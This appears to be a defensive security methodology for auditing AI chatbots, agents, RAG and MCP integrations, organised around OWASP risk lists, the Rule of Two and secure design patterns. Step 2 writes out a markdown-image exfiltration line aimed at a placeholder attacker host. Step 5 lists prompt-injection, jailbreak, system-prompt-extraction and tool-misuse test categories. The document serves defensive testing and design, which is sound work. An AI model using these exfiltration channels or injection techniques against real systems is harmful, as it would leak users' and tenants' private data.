# AI chatbots, agents, RAG and MCP — security methodology

Used by the audit (domain 3.16, module M8) and by the `ai-review` skill (design and review modes). Findings use the same template, severity scale and compatibility gate as the rest of the audit.

## Frameworks

| Framework | Use it for |
|---|---|
| OWASP Top 10 for LLM Applications 2026 (LLM01–LLM10) | Risks of a model inside an application — every AI feature |
| OWASP Top 10 for Agentic Applications (ASI01–ASI10) | Systems that plan, call tools, keep memory or act without a human at each step |
| OWASP MCP Top 10 (MCP01–MCP10, beta) | MCP servers you expose and MCP servers/clients you consume |
| OWASP AI Testing Guide v1 | Test cases across application, model, infrastructure and data layers |
| OWASP Agent Control Standard (ACS) | Runtime control points (hooks) and declarative policies for agents, where the platform supports it |
| Meta "Agents Rule of Two" + the "lethal trifecta" | Design constraint: which capabilities may coexist in one agent session |
| Prompt-injection design patterns (Beurer-Kellner et al., 2025) | Architectures that resist injection by construction |
| MITRE ATLAS | Naming adversary techniques in the threat model |
| NIST AI RMF + NIST AI 600-1 (GenAI profile), ISO/IEC 42001 | Governance, when the user needs a management framework or certification |
| LGPD | Personal data sent to providers, retention, automated decisions (art. 20) |

The core idea behind all of them: **prompt injection cannot be reliably prevented by the model itself. Design so that a fully compromised model still cannot cause harm.** Tests succeed when the system blocks the impact, not when the model refuses.

## Step 1 — AI inventory → `security-audit/ai-inventory.md`

For every AI feature (chat widget, WhatsApp/Instagram bot, internal assistant, RAG search, summarizer, classifier, scoring, AI node in n8n, coding agents running in CI, MCP server/client):

| Field | Content |
|---|---|
| ID / Nome | `AI-03 Chatbot de atendimento no site do tenant` |
| Tipo | chatbot sem ferramentas · chatbot com RAG · agente com ferramentas · agente autônomo com memória · multiagente · servidor MCP exposto · cliente MCP · IA em automação sem humano |
| Quem fala com ele | anônimo público · usuário autenticado do tenant · equipe interna · outro sistema |
| Provedor / modelo | provider, model, region, data retention setting |
| Onde a chave vive | server env / secret manager / **client (finding)** |
| Entradas não confiáveis | user messages, uploaded files, web pages, emails, RAG documents, tool results, other agents |
| Dados sensíveis acessíveis | tables, documents, memories, other tenants' data, secrets in context |
| Ferramentas / ações | each tool: what it does, credential it uses, side effects (write, send, pay, delete, call URL) |
| Canais de saída | rendered markdown/HTML, links, images, emails/messages sent, HTTP calls, files written |
| Memória | none · per conversation · per user · shared; where stored; TTL |
| Limites | max tokens, max iterations, timeouts, per-user/tenant quotas, spend cap |
| Aprovação humana | which actions, triggered by code or by the model? |
| Logs | what is logged, redaction, retention |

Search hints: `vibe-patterns.sh` AI sections, SDK imports (`openai`, `@anthropic-ai/sdk`, `ai`/`@ai-sdk/*`, `langchain`, `llamaindex`, `@modelcontextprotocol/sdk`, `@google/genai`), `tools:`/`tool_choice`/`function_call`, n8n workflow JSON with `@n8n/n8n-nodes-langchain` nodes and chat triggers, vector extensions/stores, `.mcp.json`.

Which frameworks apply: LLM Top 10 to all; Agentic Top 10 to anything with tools, memory, autonomy or multiple agents; MCP Top 10 to MCP servers and clients.

## Step 2 — Rule of Two analysis (per agent flow)

For each flow (one session/run of a feature), mark:
- **[A]** processes untrusted input (anything a non-owner can influence: customer messages, uploaded files, web pages, emails, RAG content written by others, tool results from external systems);
- **[B]** has access to sensitive systems or private data (personal data, other customers' records, secrets, internal systems);
- **[C]** can change state or communicate externally (write to DB, send email/WhatsApp, call URLs, create tickets, render remote images/links the user's browser will fetch).

An agent flow should hold **at most two** of the three. All three in one flow = the lethal trifecta: one injected instruction can read private data and send it out. Severity: **Crítico** if [A] is anonymous/public, **Alto** otherwise — unless a deterministic control breaks the chain. Remediation options, in order:
1. **Split the flow**: one session reads untrusted content and produces constrained output (e.g. a structured classification); a separate session with privileges acts on that output only.
2. **Remove one property**: drop write/egress tools, or drop access to private data, from that flow.
3. **Deterministic human approval** for the [C] actions, triggered by code (action type, amount, recipient outside allowlist), never by the model's own judgment.
4. If none fits, treat the combination as accepted high risk: HUMAN decision, with containment (scoped credentials, egress allowlist, monitoring, kill switch).

Hidden [C] channels vibe-coded chatbots forget: markdown images (`![](https://attacker/?q=<data>)`) rendered by the browser, auto-linked URLs, link previews, tools that fetch URLs, email/HTML rendering of model output.

## Step 3 — Checklist by risk

For each item: what to check, the typical vibe-coded mistake, and the control. Record findings with these IDs.

### LLM01 Prompt Injection · ASI01 Agent Goal Hijack · MCP06
- Check: every path by which untrusted text reaches the model (direct and indirect: RAG, files, web, tool results, emails, other agents, memory).
- Typical mistake: user text concatenated into the system prompt; retrieved documents inserted as if they were instructions; "the system prompt tells the model to ignore injections" as the only defense.
- Controls: instructions and data in separate roles/fields; untrusted content clearly delimited and labeled as data; Rule of Two; the design patterns in Step 4; input classifiers (e.g. Prompt Guard-style models, LLM Guard, NeMo Guardrails) only as defense in depth.

### LLM02 Sensitive Information Disclosure · LLM08 Hidden Context Exposure · MCP10
- Check: what is in the context window — system prompt, policies, tool schemas, other users' or tenants' data, secrets, internal URLs.
- Typical mistake: API keys or internal rules in the system prompt; RAG retrieving across tenants; conversation history shared between users; full stack traces returned through the chat.
- Controls: assume the system prompt and tool schemas will leak — nothing secret in them; retrieve only what the current user may read (enforced by the database/index, not by the prompt); per-user/tenant conversation and memory isolation; output scanning for PII/secret patterns as defense in depth.

### LLM03 Excessive Agency · ASI02 Tool Misuse · ASI03 Identity & Privilege Abuse · MCP02 · MCP07
- Check: each tool's capability, the credential it runs with, and who decides its arguments.
- Typical mistake: tools that run with the service role; `userId`/`tenantId` taken from model-generated arguments; one generic "run SQL" or "HTTP request" tool; text-to-SQL executed with full database privileges; a shell tool.
- Controls: tools run **with the end user's identity and permissions** (on-behalf-of), never a superuser by default; identity and tenant come from the authenticated session in code, never from the model; narrow, single-purpose tools with schema-validated arguments and server-side authorization inside each tool; allowlists for URLs, recipients and tables; read-only by default; consequential actions (money, external messages, deletion, permission changes, bulk operations) behind deterministic approval; short-lived, scoped credentials.

### LLM10 Improper Output Handling
- Check: where model output goes — HTML/markdown renderer, `eval`, SQL, shell, file paths, URLs, other APIs, emails.
- Typical mistake: `dangerouslySetInnerHTML` with model output; markdown renderer allowing raw HTML and remote images; `JSON.parse` + `eval` of "tool code"; model-built SQL executed directly.
- Controls: treat model output exactly like user input — encode, sanitize (markdown without raw HTML, remote images proxied or blocked), validate against a schema before use, parameterize queries, never execute generated code outside a sandbox.

### ASI05 Unexpected Code Execution · MCP05
- Check: any code interpreter, "run script" tool, or generated code executed.
- Controls: real sandbox (container/VM/WASM) with no network or an allowlist, no host secrets, CPU/memory/time limits, fresh per run.

### LLM05 Data and Model Poisoning · LLM09 Vector and Embedding Weaknesses · ASI06 Memory & Context Poisoning
- Check: who can write to the RAG corpus, long-term memory or fine-tuning data; how the index is partitioned.
- Typical mistake: one shared vector index for all tenants filtered only by a field the model chooses; users able to upload documents that other users' chats retrieve; memory that stores instructions from untrusted conversations.
- Controls: per-tenant index or mandatory server-side metadata filter; document ACLs synced into retrieval; provenance on every chunk/memory; review or quarantine for content that enters shared knowledge; TTL and per-user scope for memory.

### LLM04 Supply Chain · ASI04 Agentic Supply Chain · MCP03 Tool Poisoning · MCP04 · MCP09 Shadow MCP Servers
- Check: model sources, SDK versions, plugins, MCP servers (origin, version, permissions, token scope), prompt templates fetched at runtime.
- Controls: pinned and reviewed MCP servers and plugins; tool descriptions reviewed for hidden instructions; least-privilege tokens per server; inventory of every MCP server in use (no shadow servers); provider SDKs from the official registry.

### LLM06 Unbounded Consumption (denial of wallet)
- Check: public chat endpoints, max tokens, max tool iterations, timeouts, per-user/tenant/IP quotas, provider spend caps, abort on client disconnect.
- Typical mistake: an unauthenticated `/api/chat` with no rate limit calling an expensive model; agents that can loop on tool calls.
- Controls: authentication or strict anonymous quotas, rate limits calibrated from the baseline, `max_tokens`, iteration and time limits, per-tenant budgets with graceful degradation (a friendly message, not a 500), provider-side spend alerts.

### LLM07 Misinformation · ASI09 Human-Agent Trust Exploitation
- Check: where users or downstream automations act on model output without verification (health, financial, legal, contractual statements; automated decisions).
- Controls: grounding with citations, explicit uncertainty, human review for consequential decisions, UI that makes clear it is an AI (also an LGPD transparency matter), no automatic execution of advice.

### ASI07 Insecure Inter-Agent Communication · ASI08 Cascading Failures · ASI10 Rogue Agents
- Check: agent-to-agent calls, delegation chains, shared memory, retries.
- Controls: authenticated agent identities, messages between agents treated as untrusted input, recursion/delegation depth limits, circuit breakers, per-agent kill switch, behavior baselines and alerts, an action log the agent cannot alter (signed or append-only, written by the platform, not by the agent).

### MCP01 Token Mismanagement & Secret Exposure · MCP08 Lack of Audit and Telemetry
- Check: tokens in MCP configs, long-lived tokens, secrets echoed into model context or logs; logging of tool calls.
- Controls: secrets via environment/secret store, short-lived scoped tokens, redaction before anything enters the context or logs; every tool call logged with actor, tenant, tool, redacted arguments, result status and cost.

## Step 4 — Secure design patterns (choose per flow)

| Pattern | Idea | Fits |
|---|---|---|
| Action-Selector | The model only picks from a fixed menu of actions; it never composes free-form calls | Routing, triage, FAQ bots that trigger known flows |
| Plan-Then-Execute | The plan is fixed before reading untrusted content; content cannot add steps | Multi-step workflows with stable plans |
| LLM Map-Reduce | Each untrusted item is processed in isolation; only constrained outputs are aggregated | Batch processing of documents, emails, reviews |
| Dual LLM | A privileged model plans and acts; a quarantined model reads untrusted content and returns only symbolic/structured results | Reasoning over untrusted input with privileged actions (higher cost, lower utility) |
| Code-Then-Execute | The model writes a program up front; the sandbox runs it without the model re-reading untrusted data | Data transformation |
| Context-Minimization | Only the minimum untrusted content enters the context; remove the user prompt before acting | Any agent consuming external data |
| Capability / data-flow tracking (CaMeL-style) | Values carry provenance; policies decide which tool can receive tainted data | High-stakes agents where utility matters |

Practical defaults for chatbots built on business data (e.g. customer support, member service, sales):
- Answer from retrieval scoped by the session's user/tenant; never let the model choose the tenant.
- Tools are narrow verbs (`get_my_invoices`, `create_support_ticket`) with server-side authorization; no generic database or HTTP tool.
- Sending messages, changing records or money movement go through a confirmation step the user sees, triggered by code.
- Render answers as text or sanitized markdown without remote images.
- Quotas per user and per tenant; spend alerts.

## Step 5 — Testing methodology

Follow the OWASP AI Testing Guide layers (application, model, infrastructure, data). Build an adversarial suite under `tests/security/ai/` so it becomes a regression gate:

- Direct injection and jailbreaks, **in Portuguese and in English** (real users and attackers will write in pt-BR; filters tuned for English miss it), plus encodings (base64, leetspeak, invisible Unicode tags).
- Indirect injection: malicious instructions inside an uploaded PDF, a RAG document, a web page the agent reads, a tool result, an email.
- Cross-tenant and cross-user extraction: ask for another customer's data by name, ID or email; ask tools to act on another tenant's IDs.
- System prompt / hidden context extraction.
- Exfiltration channels: markdown image, links, tool calls with attacker URLs.
- Tool misuse: make the agent call a write tool it should not, with arguments it should not use; loop it into many tool calls.
- Output handling: get the model to emit `<script>`/HTML/SQL/shell payloads and check the renderer and consumers.
- Denial of wallet: very long inputs, recursive tasks, parallel sessions.
- PII leakage in answers and in logs.
- Legitimate golden set: a sample of real (anonymized) good conversations that must keep working — this is the compatibility baseline for any guardrail.

Tools (open source, all call paid model APIs — run against staging with test data and a spend cap): **promptfoo** (red-team plugins mapped to OWASP, CI regression), **garak** (NVIDIA, broad probe library), **PyRIT** (Microsoft, multi-turn orchestration), **DeepTeam** (OWASP-aligned tests). Record cost and duration in `STATE.md`.

Pass criterion: for each attack, the **impact** is blocked by a deterministic control (authorization in the tool, approval gate, egress allowlist, quota). "The model refused this time" is not a pass; note it as residual risk.

## Step 6 — Runtime controls and monitoring
- Log every model call and tool call (actor, tenant, feature, tool, redacted arguments, outcome, tokens, cost) with a retention policy.
- Alerts: tool-error spikes, approval-gate denials, cost per tenant/user over baseline, prompts matching injection signatures, unusual egress destinations.
- Kill switch per feature and per tenant, without deploy.
- Where the agent platform supports it, express policies at control points (OWASP ACS hooks: before model call, before tool call, after tool result) instead of scattering checks.
- Provider settings: data retention / zero-retention options where available, region, abuse monitoring, organization spend limits.

## Step 7 — Governance and LGPD
- Personal data sent to an AI provider: legal basis, minimization (strip identifiers that are not needed), provider contract/DPA, international transfer when the provider is abroad, retention on both sides.
- Transparency: users know they are talking to an AI.
- Automated decisions affecting people (scoring, eligibility, churn actions): LGPD art. 20 right to request review → keep a human review path and decision logs.
- Conversation logs are personal data: define retention and deletion, honor data subject requests.
- If the user needs a management framework: NIST AI RMF with the AI 600-1 GenAI profile; ISO/IEC 42001 for certification. Track Brazil's AI bill (PL 2338/2023) as regulation evolves.

## Step 8 — Compatibility for AI controls (feeds Phase 4)
AI controls break legitimate use in their own ways. Check each proposed control against:
- **Guardrail false positives**: input/output filters blocking legitimate questions — Portuguese slang, domain jargon, health or fitness terms, names. Run the golden set before and after; ship classifiers in log-only mode first.
- **Latency**: extra classifier calls and approval steps add seconds; measure against the current p95 response time.
- **Approval fatigue**: gate only consequential actions; too many confirmations make users approve blindly.
- **Quotas**: calibrate per-user/tenant limits from the baseline (messages and tokens per day at p99), with a friendly degradation message.
- **Prompt changes**: hardening the system prompt changes behavior; the golden set is the regression test.
- **Model or SDK upgrades**: pin versions; re-run the adversarial and golden suites on upgrade.
- **Tool narrowing**: removing a generic tool can break flows the team relied on; list real tool usage from logs before narrowing.
